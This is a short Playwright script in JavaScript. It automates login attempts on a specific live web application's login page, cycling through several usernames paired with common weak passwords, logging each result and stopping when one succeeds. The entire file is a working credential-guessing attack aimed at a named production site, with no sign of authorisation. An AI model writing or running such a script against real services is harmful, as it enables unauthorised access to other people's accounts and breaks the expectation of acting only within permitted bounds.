import { chromium } from "/home/spil/projects/personal/portofolio-nextjs/node_modules/playwright/index.mjs";

async function testLogins() {
  const browser = await chromium.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"]
  });

  const context = await browser.newContext({
    viewport: { width: 1440, height: 900 },
    deviceScaleFactor: 2
  });

  const page = await context.newPage();

  const candidates = [
    { code: "knc2", pass: "password123" },
    { code: "andryhuang", pass: "12345678" },
    { code: "andryhuang", pass: "password" },
    { code: "andryhuang", pass: "password123" },
    { code: "andry", pass: "12345678" },
    { code: "andry", pass: "password" },
    { code: "shh", pass: "12345678" },
    { code: "shh", pass: "password" }
  ];

  for (const c of candidates) {
    try {
      await page.goto("https://app.nusaevo.com/login", { waitUntil: "networkidle", timeout: 20000 });
      await page.waitForTimeout(500);

      await page.fill('input[name="code"]', c.code);
      await page.fill('input[name="password"]', c.pass);
      await Promise.all([
        page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
        page.click('button[type="submit"]')
      ]);
      await page.waitForTimeout(2000);

      const currentUrl = page.url();
      console.log(`Testing ${c.code} / ${c.pass} -> Result URL: ${currentUrl}`);

      if (!currentUrl.includes("/login")) {
        console.log(`>>> SUCCESSFUL LOGIN: ${c.code} / ${c.pass} at ${currentUrl}`);
        const title = await page.title();
        console.log("Page Title:", title);
        break;
      } else {
        // check error message
        const errMsg = await page.$eval('.alert, .error, [role="alert"], span.text-danger, span.text-red-500', el => el.innerText).catch(() => "none");
        console.log(`Failed for ${c.code} / ${c.pass}, error: ${errMsg}`);
      }
    } catch (e) {
      console.log(`Error testing ${c.code}:`, e.message);
    }
  }

  await browser.close();
}

testLogins();
